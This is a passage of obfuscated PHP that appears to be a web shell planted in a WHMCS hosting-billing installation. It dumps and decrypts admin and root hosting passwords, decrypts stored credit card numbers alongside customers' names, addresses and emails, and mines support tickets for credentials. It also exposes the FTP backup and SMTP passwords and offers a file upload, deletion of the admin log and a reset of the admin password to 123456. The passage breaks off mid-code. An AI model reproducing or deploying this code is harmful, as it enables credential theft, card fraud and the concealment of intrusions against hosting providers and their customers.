<NOFRAMES> <P>Cette page utilise des cadres, mais votre navigateur ne les prend pas en charge.</p> </NOFRAMES>");break;${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblhosting where username = 'root' or username = 'Admin' or username = 'admin' or username = 'Administrator' or  username = 'administrator' order by domainstatus");if(!is_array(mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]}))){echo"<center><h1>Nothing Found !</h1></center>";}else{${"GLOBALS"}["xiknpcobi"]="query";$hrndielcuz="v";${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblhosting where username = 'root' or username = 'Admin' or username = 'admin' or username = 'Administrator' or  username = 'administrator' order by domainstatus");echo"<center><h1>Clients r00ts<h1> <br><form action="?p=3\" name=\"formw\" method=\"post">

<input name=\"export" type=\"hidden\" value="1">
<center><input type="submit" name=\"submit2" class=\"buttons\" value=\"[Save to TXT file ]" /></center>"."<br><table border='0' cellpadding='5' align='center'>
    <tr><td>domain</td><td>Dedicatedip</td><td>User</td><td>Pass</td><td>domainstatus</td></tr>";while(${$hrndielcuz}=mysql_fetch_array(${${"GLOBALS"}["xiknpcobi"]})){${"GLOBALS"}["kgrromgs"]="v";${"GLOBALS"}["teuzeotx"]="v";$ilguka="v";echo"<tr><td>".${$ilguka}["domain"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["dedicatedip"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["username"]."</td><td>".decrypt(${${"GLOBALS"}["teuzeotx"]}["password"],${${"GLOBALS"}["datzsblhzhf"]})."</td><td>".${${"GLOBALS"}["kgrromgs"]}["domainstatus"]."</td></tr>";}echo"</table>";}if($_POST["export"]==1){${"GLOBALS"}["rlkmwblmwc"]="textr";$rmxlfo="query";${"GLOBALS"}["vhcxltunn"]="textr";$rbuvftnvx="textr";$hvlekskhwji="query";${${"GLOBALS"}["rlkmwblmwc"]}=${${"GLOBALS"}["xpgcpicbvk"]}."
######################### Client R00ts ###########################
";${$rmxlfo}=mysql_query("SELECT * FROM tblhosting where username = 'root' or username = 'Admin' or username = 'admin' or username = 'Administrator' or  username = 'administrator' order by domainstatus");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${$hvlekskhwji})){$vtkreimpzjf="textr";${"GLOBALS"}["kkdvkpesy"]="textr";${"GLOBALS"}["ixughfdou"]="v";${"GLOBALS"}["hexsyools"]="v";${$vtkreimpzjf}=${${"GLOBALS"}["kkdvkpesy"]}."
Domain ".${${"GLOBALS"}["hexsyools"]}["domain"]."
IP ".${${"GLOBALS"}["ixughfdou"]}["dedicatedip"]."
Username ".${${"GLOBALS"}["sqgchrxwl"]}["username"]."
Password ".decrypt(${${"GLOBALS"}["sqgchrxwl"]}["password"],${${"GLOBALS"}["datzsblhzhf"]})."
Domainstatus".${${"GLOBALS"}["sqgchrxwl"]}["domainstatus"]."
";}${${"GLOBALS"}["xpgcpicbvk"]}=${$rbuvftnvx}."
######################### Client R00ts ###########################
";@ob_end_clean();header("Content-length: ".strlen(${${"GLOBALS"}["xpgcpicbvk"]}));header("Content-type: text/plain");header("Content-Disposition: attachment; filename=".$_SERVER["HTTP_HOST"]."-client_R00t.txt");echo(${${"GLOBALS"}["vhcxltunn"]});}break;case 4:${${"GLOBALS"}["akmxxe"]}=$_GET["qq"];${${"GLOBALS"}["bfhqlodqci"]}=str_replace(" ","%",$_POST["q"]);if(${${"GLOBALS"}["bxhhgvfowce"]}<>"")${$cmchkvpfw}=${${"GLOBALS"}["wbnblpaukq"]};if(${${"GLOBALS"}["bfhqlodqci"]}=="")${${"GLOBALS"}["bfhqlodqci"]}="%";if(${$kusogzqbsn}=="")${${"GLOBALS"}["akmxxe"]}=${${"GLOBALS"}["zomhvciviu"]};${${"GLOBALS"}["gcxuyplbilvy"]}=mysql_query("SELECT * FROM tblhosting order by domainstatus LIMIT  0,5");if(!is_array(mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]}))){echo"<center><h1>Nothing Found !</h1></center>";}else{${"GLOBALS"}["qnvkvdpdet"]="q";$vjlnks="q";${"GLOBALS"}["wlwycbo"]="q";${"GLOBALS"}["kvthckeo"]="query";${"GLOBALS"}["yfbtdapoah"]="q";echo"<center><h1>Clients Hosting Accounts</h1> "."<br><form action="?p=4\" name="formw" method="post\">

<input name="export" type=\"hidden\" value="1\">
<center><input type=\"submit" name="submit2" class="buttons\" value="[Save to TXT file ]" /></form></center>"."<br>";echo("<center><FORM action="?p=4"  method=\"post\">

<input type="text\" name="q\" value="".${${"GLOBALS"}["bfhqlodqci"]}."">
<br>
<INPUT class=submit type="submit\" value=\"Submit" name=\"Submit">
</form>");$psfiprjrxmn="q";${"GLOBALS"}["lqfxghgms"]="page";${"GLOBALS"}["pwiherwvjexn"]="query";${"GLOBALS"}["itkiwjnyce"]="start_from";${"GLOBALS"}["jsmjldnq"]="q";${"GLOBALS"}["ektsogbgrhl"]="q";${"GLOBALS"}["uhzjkbvmp"]="q";$homivdzsnec="page";if(isset($_GET["page"])){$cphkyitykdgv="page";${$cphkyitykdgv}=intval($_GET["page"]);}else{$nkmqebg="page";${$nkmqebg}=1;}${${"GLOBALS"}["itkiwjnyce"]}=(${${"GLOBALS"}["ikmuojf"]}-1)*100;$jcjvrqfdw="total_records";$vsrbwrqmgzc="page";$eudfsxcvt="query";$lvqmovys="q";${${"GLOBALS"}["kvthckeo"]}=mysql_query("SELECT * FROM tblhosting where dedicatedip LIKE '%".${$lvqmovys}."%' or ns1 LIKE '%".${${"GLOBALS"}["yfbtdapoah"]}."%' or ns2 LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' or username  LIKE '%".${${"GLOBALS"}["jsmjldnq"]}."%' or domain LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' order by domainstatus LIMIT $start_from , 100 ");${$jcjvrqfdw}=mysql_num_rows(mysql_query("SELECT * FROM tblhosting where dedicatedip LIKE '%".${$psfiprjrxmn}."%' or ns1 LIKE '%".${${"GLOBALS"}["ektsogbgrhl"]}."%' or ns2 LIKE '%".${$vjlnks}."%' or username  LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' or domain LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' order by domainstatus"));echo("<h3>Total Records ".${${"GLOBALS"}["moukxffcs"]}."<br>");${${"GLOBALS"}["yxqmufxnqcs"]}=ceil(${${"GLOBALS"}["moukxffcs"]}/100);echo("<br><table border='0'><tr>");echo("<td>Page ".${$vsrbwrqmgzc}." Of ".${${"GLOBALS"}["yxqmufxnqcs"]}."</td>");${"GLOBALS"}["zdukby"]="v";if(${${"GLOBALS"}["ikmuojf"]}>1)echo"<td><a href='?p=4&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${${"GLOBALS"}["lqfxghgms"]}-1)."'>Back</a>&nbsp</td>";echo"<td><a href='?p=4&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".${${"GLOBALS"}["yxqmufxnqcs"]}."'>Latest</a></td>";if(${${"GLOBALS"}["ikmuojf"]}<${${"GLOBALS"}["yxqmufxnqcs"]})echo"<td>&nbsp<a href='?p=4&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${$homivdzsnec}+1)."'>Next</a>&nbsp</td>";for(${${"GLOBALS"}["hiufclnubxn"]}=1;${${"GLOBALS"}["hiufclnubxn"]}<=${${"GLOBALS"}["yxqmufxnqcs"]};${${"GLOBALS"}["hiufclnubxn"]}++){${"GLOBALS"}["ebwwmifpws"]="page";if(${${"GLOBALS"}["hiufclnubxn"]}==${${"GLOBALS"}["ebwwmifpws"]}){$yfbcotv="qq";echo"<td>&nbsp<a href='?p=4&qq=".${$yfbcotv}."&page=".${${"GLOBALS"}["hiufclnubxn"]}."'>(".${${"GLOBALS"}["hiufclnubxn"]}.")</a>&nbsp</td>";}else{$bpvmoqni="i";${"GLOBALS"}["sdncuf"]="i";echo"<td>&nbsp<a href='?p=4&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".${$bpvmoqni}."'>".${${"GLOBALS"}["sdncuf"]}."</a>&nbsp</td>";}}echo("</tr></table>");if(!is_array(mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]}))){echo"Nothing Found !";exit;}echo"<br><table border='0' cellpadding='5' align='center'>
    <tr><td>domain</td><td>Dedicatedip</td><td>User</td><td>Pass</td><td>domainstatus</td><td>Client ID</td></tr>";${$eudfsxcvt}=mysql_query("SELECT * FROM tblhosting where dedicatedip LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' or ns1 LIKE '%".${${"GLOBALS"}["wlwycbo"]}."%' or ns2 LIKE '%".${${"GLOBALS"}["qnvkvdpdet"]}."%' or username  LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' or domain LIKE '%".${${"GLOBALS"}["uhzjkbvmp"]}."%' order by domainstatus LIMIT $start_from , 100 ");while(${${"GLOBALS"}["zdukby"]}=mysql_fetch_array(${${"GLOBALS"}["pwiherwvjexn"]})){${"GLOBALS"}["xlvhtko"]="v";$gvhthoyig="v";${"GLOBALS"}["cgasxhsbeo"]="v";$simjxrwm="v";echo"<tr><td>".${${"GLOBALS"}["sqgchrxwl"]}["domain"]."</td><td>".${$simjxrwm}["dedicatedip"]."</td><td>".${$gvhthoyig}["username"]."</td><td>".decrypt(${${"GLOBALS"}["cgasxhsbeo"]}["password"],${${"GLOBALS"}["datzsblhzhf"]})."</td><td>".${${"GLOBALS"}["xlvhtko"]}["domainstatus"]."</td><td> <a href='?p=12&id=".${${"GLOBALS"}["sqgchrxwl"]}["userid"]."'>".${${"GLOBALS"}["sqgchrxwl"]}["userid"]."</a></td></tr>";}echo"</table>";}if($_POST["export"]=="1"){${${"GLOBALS"}["alisvlov"]}=${${"GLOBALS"}["alisvlov"]}."
######################### Client HOST ###########################
";${"GLOBALS"}["rjibwxsnjtcz"]="textr";${"GLOBALS"}["ofxnjrlwmdu"]="v";${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblhosting where domainstatus='Active'");$rvqrsko="textr";$lsngntnws="query";while(${${"GLOBALS"}["ofxnjrlwmdu"]}=mysql_fetch_array(${$lsngntnws})){${"GLOBALS"}["kpsazd"]="v";${"GLOBALS"}["fjvcfoye"]="v";if((${${"GLOBALS"}["kpsazd"]}["username"])and(${${"GLOBALS"}["fjvcfoye"]}["password"])){$sldqnioomci="textr";${"GLOBALS"}["vrksmqbfyaow"]="v";$ylykkkse="v";$qyytacdpii="v";${$sldqnioomci}=${${"GLOBALS"}["xpgcpicbvk"]}."
Domain ".${$ylykkkse}["domain"]."
IP ".${${"GLOBALS"}["vrksmqbfyaow"]}["dedicatedip"]."
Username ".${${"GLOBALS"}["sqgchrxwl"]}["username"]."
Password ".decrypt(${$qyytacdpii}["password"],${${"GLOBALS"}["datzsblhzhf"]})."
Domainstatus ".${${"GLOBALS"}["sqgchrxwl"]}["domainstatus"]."
";}}${${"GLOBALS"}["rjibwxsnjtcz"]}=${$rvqrsko}."
######################### Client HOST ###########################
";@ob_end_clean();header("Content-length: ".strlen(${${"GLOBALS"}["xpgcpicbvk"]}));header("Content-type: text/plain");header("Content-Disposition: attachment; filename=".$_SERVER["HTTP_HOST"]."-client_host.txt");echo(${${"GLOBALS"}["xpgcpicbvk"]});}break;case 5:${$ixffiogjjei}=mysql_query("SELECT * FROM `tblclients` WHERE cardtype <> '' order by issuenumber desc");if(!is_array(mysql_fetch_array(${$bpqbxrwo}))){echo"<center><h1>Nothing Found !</h1></center>";}else{${"GLOBALS"}["ryskyhq"]="query";${${"GLOBALS"}["ryskyhq"]}=mysql_query("SELECT * FROM `tblclients` WHERE cardtype <> '' order by issuenumber desc");echo("<table border=1><tr><td>cardtype</td><td>cardnum</td><td>expdate</td><td>issuenumber</td><td>Country</td><td>Firstname</td><td>Lastname</td><td>Address1</td><td>City</td><td>State</td><td>Postcode</td><td>phonenumber</td><td>Email</td></tr>");$crntpjvs="v";$luhqqmx="query";while(${$crntpjvs}=mysql_fetch_array(${$luhqqmx})){${"GLOBALS"}["olrepjkldqa"]="firstname";${"GLOBALS"}["tffxuo"]="v";$xbmihe="v2";${"GLOBALS"}["icxohpgct"]="phonenumber";${${"GLOBALS"}["rmldtskxf"]}=md5(${${"GLOBALS"}["datzsblhzhf"]}.${${"GLOBALS"}["tffxuo"]}["0"]);${"GLOBALS"}["nracieg"]="s";${"GLOBALS"}["yzollpvdxxf"]="email";${"GLOBALS"}["jxshovixduk"]="city";$ltirpozqbh="postcode";$jwdqnctm="country";${${"GLOBALS"}["nracieg"]}=mysql_query("select cardtype,AES_DECRYPT(cardnum,'{$cchash}') as cardnum,AES_DECRYPT(expdate,'{$cchash}') as expdate,AES_DECRYPT(issuenumber,'{$cchash}') as issuenumber,AES_DECRYPT(startdate,'{$cchash}') as startdate,country,email,firstname,lastname,address1,city,state,postcode,phonenumber  FROM `tblclients` where id='".${${"GLOBALS"}["sqgchrxwl"]}["0"]."'  order by country");$huyjqqfuq="v";${$jwdqnctm}=${${"GLOBALS"}["sqgchrxwl"]}["country"];${${"GLOBALS"}["yzollpvdxxf"]}=${${"GLOBALS"}["sqgchrxwl"]}["email"];${"GLOBALS"}["uxzfeg"]="v";${${"GLOBALS"}["olrepjkldqa"]}=${$huyjqqfuq}["firstname"];${${"GLOBALS"}["fuwtcdyygb"]}=${${"GLOBALS"}["sqgchrxwl"]}["lastname"];${"GLOBALS"}["qgqxjvyn"]="v2";${${"GLOBALS"}["lzymhfcjh"]}=${${"GLOBALS"}["sqgchrxwl"]}["address1"];${"GLOBALS"}["cjjbcdlwuw"]="state";${${"GLOBALS"}["jxshovixduk"]}=${${"GLOBALS"}["sqgchrxwl"]}["city"];${${"GLOBALS"}["cjjbcdlwuw"]}=${${"GLOBALS"}["sqgchrxwl"]}["state"];${$ltirpozqbh}=${${"GLOBALS"}["sqgchrxwl"]}["postcode"];${${"GLOBALS"}["icxohpgct"]}=${${"GLOBALS"}["uxzfeg"]}["phonenumber"];${${"GLOBALS"}["qnganuhfwtyh"]}=mysql_fetch_array(${${"GLOBALS"}["holppdzxh"]});echo("<tr><td>".${${"GLOBALS"}["qnganuhfwtyh"]}[0]."</td><td>".${${"GLOBALS"}["qnganuhfwtyh"]}[1]."</td><td>".${$xbmihe}[2]."</td><td>".${${"GLOBALS"}["qgqxjvyn"]}[4]."</td><td>$country</td><td> $firstname</td><td>$lastname</td><td>$address1</td><td>$city</td><td>$state</td><td>$postcode</td><td>$phonenumber</td><td>$email</td></tr>");}echo("</table>");}break;case 61:${${"GLOBALS"}["akmxxe"]}=$_GET["qq"];${$gratlbvcudj}=str_replace(" ","%",$_POST["q"]);if(${${"GLOBALS"}["akmxxe"]}<>"")${$ztjmaka}=${$khumirs};if(${$dysqpoj}=="")${${"GLOBALS"}["bfhqlodqci"]}="%";if(${${"GLOBALS"}["akmxxe"]}=="")${${"GLOBALS"}["movmxrodnm"]}=${${"GLOBALS"}["bfhqlodqci"]};echo("<center><br><br><br><FORM action=\"?p=61\"  method="post\">
<input type=\"text\" name="q\" value="".${${"GLOBALS"}["vjknjbv"]}."\">
<br>
<INPUT class=submit type="submit\" value=\"Submit\" name="Submit"> <br>ex: root%pass or  root or 2086
");if(isset($_GET["page"])){${${"GLOBALS"}["ikmuojf"]}=intval($_GET["page"]);}else{${"GLOBALS"}["jhveexx"]="page";${${"GLOBALS"}["jhveexx"]}=1;}${${"GLOBALS"}["wwepbwx"]}=(${${"GLOBALS"}["ikmuojf"]}-1)*100;${${"GLOBALS"}["ggzkiuj"]}=mysql_query("SELECT * FROM `tbltickets` where message LIKE '%".${${"GLOBALS"}["bfhqlodqci"]}."%' order by date desc LIMIT $start_from , 100 ");${${"GLOBALS"}["moukxffcs"]}=mysql_num_rows(mysql_query("SELECT * FROM `tbltickets` where message LIKE '%".${$icdhoailw}."%' order by date desc"));echo("<h3>Total Records ".${${"GLOBALS"}["dseenyxe"]}."<br>");${$krnlvxwgcua}=ceil(${$iplyknyqxey}/100);echo("<br><table border='0'><tr>");echo("<td>Page ".${${"GLOBALS"}["ikmuojf"]}." Of ".${${"GLOBALS"}["yxqmufxnqcs"]}."</td>");if(${${"GLOBALS"}["ikmuojf"]}>1)echo"<td><a href='?p=61&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${$juqovtr}-1)."'>Back</a>&nbsp</td>";echo"<td><a href='?p=61&qq=".${$powgjiqs}."&page=".${${"GLOBALS"}["yxqmufxnqcs"]}."'>Latest</a></td>";if(${${"GLOBALS"}["emleede"]}<${$limtvyhy})echo"<td>&nbsp<a href='?p=61&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${${"GLOBALS"}["xofppepvt"]}+1)."'>Next</a>&nbsp</td>";for(${${"GLOBALS"}["erwtyhzu"]}=1;${${"GLOBALS"}["hiufclnubxn"]}<=${${"GLOBALS"}["yxqmufxnqcs"]};${${"GLOBALS"}["hiufclnubxn"]}++){$utpsmhmgsc="page";$qmgvbqykv="i";if(${$qmgvbqykv}==${$utpsmhmgsc}){$qzxouywbts="i";${"GLOBALS"}["fdatohlpgqw"]="i";$pajcjscfsmfb="qq";echo"<td>&nbsp<a href='?p=61&qq=".${$pajcjscfsmfb}."&page=".${$qzxouywbts}."'>(".${${"GLOBALS"}["fdatohlpgqw"]}.")</a>&nbsp</td>";}else{${"GLOBALS"}["qypfmpejpb"]="i";${"GLOBALS"}["indptudyva"]="i";${"GLOBALS"}["ngkhetd"]="qq";echo"<td>&nbsp<a href='?p=61&qq=".${${"GLOBALS"}["ngkhetd"]}."&page=".${${"GLOBALS"}["qypfmpejpb"]}."'>".${${"GLOBALS"}["indptudyva"]}."</a>&nbsp</td>";}}echo("</tr></table>");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${$uudoelu})){${"GLOBALS"}["jkywlqykvnm"]="v";$xykxhcrsclg="v";$cdgtefwjbetv="v";echo("<center><hr><table width=90% border=1>");echo("<tr><td>".${$cdgtefwjbetv}["title"]."[".${$xykxhcrsclg}["date"]."]</td></tr><tr><td>".${${"GLOBALS"}["jkywlqykvnm"]}["message"]."</td></tr>");echo("</table>");}break;case 62:${$gunsnlwfq}=$_GET["qq"];${${"GLOBALS"}["bfhqlodqci"]}=str_replace(" ","%",$_POST["q"]);if(${${"GLOBALS"}["akmxxe"]}<>"")${$dxmuqhwqetns}=${${"GLOBALS"}["akmxxe"]};if(${${"GLOBALS"}["whvclkauo"]}=="")${${"GLOBALS"}["bfhqlodqci"]}="%";if(${${"GLOBALS"}["lplunc"]}=="")${${"GLOBALS"}["vhfscebilj"]}=${${"GLOBALS"}["zjnwvfdxn"]};echo("<center><br><br><br><FORM action="?p=62\"  method=\"post\">
<input type="text" name=\"q\" value="".${${"GLOBALS"}["eswkbw"]}."">
<br>
<INPUT class=submit type="submit" value="Submit" name=\"Submit">
");if(isset($_GET["page"])){${"GLOBALS"}["opmyavxdmhg"]="page";${${"GLOBALS"}["opmyavxdmhg"]}=intval($_GET["page"]);}else{${"GLOBALS"}["mlkmkxtmu"]="page";${${"GLOBALS"}["mlkmkxtmu"]}=1;}${${"GLOBALS"}["wwepbwx"]}=(${${"GLOBALS"}["ikmuojf"]}-1)*100;${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM `tblticketreplies` where message LIKE '%".${$cabnldqq}."%' order by date desc LIMIT $start_from , 100 ");${${"GLOBALS"}["yhrlspt"]}=mysql_num_rows(mysql_query("SELECT * FROM `tblticketreplies` where message LIKE '%".${${"GLOBALS"}["vmufmxkif"]}."%' order by date desc"));echo("<h3>Total Records ".${${"GLOBALS"}["vpvulpll"]}."<br>");${$rbfnqunecwtk}=ceil(${${"GLOBALS"}["moukxffcs"]}/100);echo("<br><table border='0'><tr>");echo("<td>Page ".${${"GLOBALS"}["ikmuojf"]}." Of ".${${"GLOBALS"}["yxqmufxnqcs"]}."</td>");if(${${"GLOBALS"}["ohkgnmv"]}>1)echo"<td><a href='?p=62&qq=".${${"GLOBALS"}["wxlvsayvl"]}."&page=".(${${"GLOBALS"}["hfrripeqw"]}-1)."'>Back</a>&nbsp</td>";echo"<td><a href='?p=62&qq=".${${"GLOBALS"}["ypirnrygq"]}."&page=".${${"GLOBALS"}["yxqmufxnqcs"]}."'>Latest</a></td>";if(${${"GLOBALS"}["ikmuojf"]}<${${"GLOBALS"}["yxqmufxnqcs"]})echo"<td>&nbsp<a href='?p=62&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${$fbmootfzyeep}+1)."'>Next</a>&nbsp</td>";for(${${"GLOBALS"}["iwgkwzxog"]}=1;${$hajeir}<=${${"GLOBALS"}["pfxtpflwl"]};${${"GLOBALS"}["vgmpmpyqmo"]}++){${"GLOBALS"}["jdouuvtvmo"]="page";${"GLOBALS"}["jhrvsgymg"]="i";if(${${"GLOBALS"}["jhrvsgymg"]}==${${"GLOBALS"}["jdouuvtvmo"]}){${"GLOBALS"}["ichvhjp"]="i";echo"<td>&nbsp<a href='?p=62&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".${${"GLOBALS"}["hiufclnubxn"]}."'>(".${${"GLOBALS"}["ichvhjp"]}.")</a>&nbsp</td>";}else{$yosmlsuxkoq="qq";echo"<td>&nbsp<a href='?p=62&qq=".${$yosmlsuxkoq}."&page=".${${"GLOBALS"}["hiufclnubxn"]}."'>".${${"GLOBALS"}["hiufclnubxn"]}."</a>&nbsp</td>";}}echo("</tr></table>");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${${"GLOBALS"}["xvcigmwm"]})){$jiqrpifgp="v";echo("<center><hr><table width=90% border=1>");echo("<tr><td>[".${$jiqrpifgp}["date"]."]</td></tr><tr><td>".${${"GLOBALS"}["sqgchrxwl"]}["message"]."</td></tr>");echo("</table>");}break;case 63:${${"GLOBALS"}["akmxxe"]}=$_GET["qq"];${$yjgqlxkqqz}=str_replace(" ","%",$_POST["q"]);if(${${"GLOBALS"}["akmxxe"]}<>"")${${"GLOBALS"}["bfhqlodqci"]}=${$zhonohalncvc};if(${$jhtscpteveh}=="")${$dxupbio}="%";if(${$xtclfqyirsu}=="")${${"GLOBALS"}["akmxxe"]}=${${"GLOBALS"}["bfhqlodqci"]};echo("<center><br><br><br><FORM action=\"?p=63\"  method="post\">
<input type="text" name="q" value=\"".${${"GLOBALS"}["bfhqlodqci"]}."">
<br>
<INPUT class=submit type=\"submit\" value=\"Submit\" name="Submit\"> ex: root%pass or  root or 2086
");if(isset($_GET["page"])){$lpkuazjwibye="page";${$lpkuazjwibye}=intval($_GET["page"]);}else{${${"GLOBALS"}["ikmuojf"]}=1;}${$bobdjbtpo}=(${${"GLOBALS"}["fqkgakb"]}-1)*100;${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query(" select id as tid,date FROM tbltickets  where message LIKE '%".${$pobdlt}."%' union SELECT  tid,date FROM `tblticketreplies` where message LIKE '%".${$puuuunsn}."%' order by date desc");while(${${"GLOBALS"}["apfvsegdq"]}=@mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){${"GLOBALS"}["mvgddxz"]="vv";$qvloyduo="list_tid0";${$qvloyduo}[]=${${"GLOBALS"}["mvgddxz"]}["tid"];}${${"GLOBALS"}["mjocwvv"]}=@array_values(array_unique(${${"GLOBALS"}["nyemdrab"]}));${${"GLOBALS"}["moukxffcs"]}=count(${$gpttvqv});if(${$xiqynvwsuo}==0)exit;echo("<h3>Total Records ".${${"GLOBALS"}["moukxffcs"]}."<br>");${${"GLOBALS"}["yxqmufxnqcs"]}=ceil(${$lscacpqgy}/50);echo("<br><table border='0'><tr>");echo("<td>Page ".${${"GLOBALS"}["wexrijbytls"]}." Of ".${$wvlbje}."</td>");if(${${"GLOBALS"}["ikmuojf"]}>1)echo"<td><a href='?p=63&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".(${${"GLOBALS"}["hurqkvya"]}-1)."'>Back</a>&nbsp</td>";echo"<td><a href='?p=63&qq=".${${"GLOBALS"}["oskifgm"]}."&page=".${${"GLOBALS"}["wtdvngebcpmb"]}."'>Latest</a></td>";if(${${"GLOBALS"}["ikmuojf"]}<${${"GLOBALS"}["ikzegshuub"]})echo"<td>&nbsp<a href='?p=63&qq=".${$vqldrghoit}."&page=".(${${"GLOBALS"}["ikmuojf"]}+1)."'>Next</a>&nbsp</td>";for(${${"GLOBALS"}["hiufclnubxn"]}=1;${${"GLOBALS"}["hiufclnubxn"]}<=${${"GLOBALS"}["yxqmufxnqcs"]};${$zwpqoyuvvlqh}++){${"GLOBALS"}["inejskz"]="i";if(${${"GLOBALS"}["inejskz"]}==${${"GLOBALS"}["ikmuojf"]}){$joreewkp="i";echo"<td>&nbsp<a href='?p=63&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".${$joreewkp}."'>(".${${"GLOBALS"}["hiufclnubxn"]}.")</a>&nbsp</td>";}else{${"GLOBALS"}["kgcyvfbh"]="i";echo"<td>&nbsp<a href='?p=63&qq=".${${"GLOBALS"}["akmxxe"]}."&page=".${${"GLOBALS"}["kgcyvfbh"]}."'>".${${"GLOBALS"}["hiufclnubxn"]}."</a>&nbsp</td>";}}echo("</tr></table>");for(${${"GLOBALS"}["hiufclnubxn"]}=${${"GLOBALS"}["wwepbwx"]};${${"GLOBALS"}["xtphpyjxtcrt"]}<(${${"GLOBALS"}["wwepbwx"]}+50);${${"GLOBALS"}["qrqqqxofvpz"]}++){${"GLOBALS"}["ccqtogbqlrx"]="list_tid";${"GLOBALS"}["pdyjume"]="query1";${${"GLOBALS"}["iahgcggxrfyj"]}=mysql_query("SELECT * FROM tbltickets  where id='".${${"GLOBALS"}["ccqtogbqlrx"]}[${${"GLOBALS"}["hiufclnubxn"]}]."'");${"GLOBALS"}["ivwkpxfrm"]="v";while(${${"GLOBALS"}["ivwkpxfrm"]}=mysql_fetch_array(${${"GLOBALS"}["pdyjume"]})){$eawrcxewi="v";${"GLOBALS"}["plpsuhxpg"]="v";echo("<br><br>Ticket ID ".${${"GLOBALS"}["sqgchrxwl"]}["id"]."<br><br><table border=1>");$vbcgwod="v";$rrphicezfd="v";$gmacxzccy="query2";echo("<tr><td><table width=100% border=1><tr><td>".${$rrphicezfd}["title"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["date"]."]</td><td>User id <a href='?p=12&id=".${${"GLOBALS"}["plpsuhxpg"]}["userid"]."'>".${$vbcgwod}["userid"]."</a></td><td>Ticket ID ".${$eawrcxewi}["id"]."</td></tr></table></td></tr>");if(${${"GLOBALS"}["sqgchrxwl"]}["attachment"]){${"GLOBALS"}["pcogncisk"]="v";${"GLOBALS"}["qheitqqqhh"]="v";echo("<tr><td>".(${${"GLOBALS"}["pcogncisk"]}["message"])."<br>-----------<br>Attachment<br>".(${${"GLOBALS"}["qheitqqqhh"]}["attachment"])."</td></tr>");}else{${"GLOBALS"}["rlugcicxhywr"]="v";echo("<tr><td>".(${${"GLOBALS"}["rlugcicxhywr"]}["message"])."</td></tr>");}$bhmlcykkmki="query2";${$gmacxzccy}=mysql_query("select * from tblticketreplies where tid='".${${"GLOBALS"}["sqgchrxwl"]}["id"]."'");while(${${"GLOBALS"}["qnganuhfwtyh"]}=mysql_fetch_array(${$bhmlcykkmki})){$gxcehffx="v2";$tdqzcklfqt="v2";${"GLOBALS"}["srwocvpht"]="v2";if(${$tdqzcklfqt}["admin"]){echo("<tr><td> By ".${${"GLOBALS"}["qnganuhfwtyh"]}["admin"]."</td></tr><tr><td>".(${${"GLOBALS"}["qnganuhfwtyh"]}["message"])." <br>-----------<br>Attachment<br>".(${${"GLOBALS"}["qnganuhfwtyh"]}["attachment"])."</td></tr>");}else
echo("<tr><td> By Client </td></tr><tr><td>".(${${"GLOBALS"}["srwocvpht"]}["message"])." <br>-----------<br>Attachment<br>".(${$gxcehffx}["attachment"])."</td></tr>");}echo("</table>");}}break;case 7:${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblconfiguration where setting='FTPBackupHostname' or setting='FTPBackupUsername' or  setting='FTPBackupPassword' or  setting='FTPBackupDestination' or  setting='SMTPHost' or  setting='SMTPUsername' or setting='SMTPPassword' or  setting='SMTPPort'");if(!is_array(mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]}))){echo"<center><h1>Nothing Found !</h1></center>";}else{${"GLOBALS"}["bpeujrie"]="v";${"GLOBALS"}["lbhbmot"]="query";echo("<center><h1>Domain Reseller<h1> <br><table border='0'>");echo("<tr><td>Setting</td><td>Value</td></tr>");while(${${"GLOBALS"}["bpeujrie"]}=mysql_fetch_array(${${"GLOBALS"}["lbhbmot"]})){${"GLOBALS"}["ucehiupi"]="value";$ntjghek="value";$knsfjvdunlj="v";${$ntjghek}=${$knsfjvdunlj}["value"];if(${${"GLOBALS"}["ucehiupi"]}==""){${"GLOBALS"}["mukgimcxryp"]="value";${${"GLOBALS"}["mukgimcxryp"]}=0;}echo("<tr><td>".${${"GLOBALS"}["sqgchrxwl"]}["setting"]."</td><td>".${${"GLOBALS"}["kpnorw"]}." </td></tr>");}echo"</table><br><br></center>";}break;case 8:echo"<center><h1>File Upload</h1><br><br><form method=\"POST" action="?p=8\" enctype="multipart/form-data"><input type=\"file\" name="image"><input type=\"Submit\" name=\"Submit\" value=\"Submit"><input type=\"hidden\" name="f" value="upload"></form>";echo"<hr><center><h1>Delete Adminlog</h1><br><form method=\"POST\" action="?p=8" ><input type="text\" name="ip" value=\"".$_SERVER["REMOTE_ADDR"]."\"><input type=\"Submit" name=\"Submit" value="Submit\"><input type="hidden" name="f\" value="ip"></form>";echo"<hr><center><h1>Change Admin Password to 123456</h1><br><form method="POST\" action="?p=8\" 